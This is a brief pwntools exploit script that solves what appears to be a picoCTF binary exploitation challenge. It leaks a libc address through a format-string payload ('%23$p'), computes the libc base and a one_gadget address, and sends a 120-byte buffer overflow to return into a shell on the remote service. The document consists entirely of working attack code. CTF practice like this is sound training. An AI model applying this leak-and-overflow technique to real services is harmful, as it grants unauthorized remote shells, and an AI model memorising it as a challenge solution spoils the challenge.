from pwn import *

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 54097
r = remote(HOST, PORT)

r.sendline('%23$p')
libc = int(r.recvline().decode().strip(), 16) - 0x21ba0 - 231
sh = libc + 0x4f302
r.sendline(b'A' * 120 + p64(sh))

r.interactive()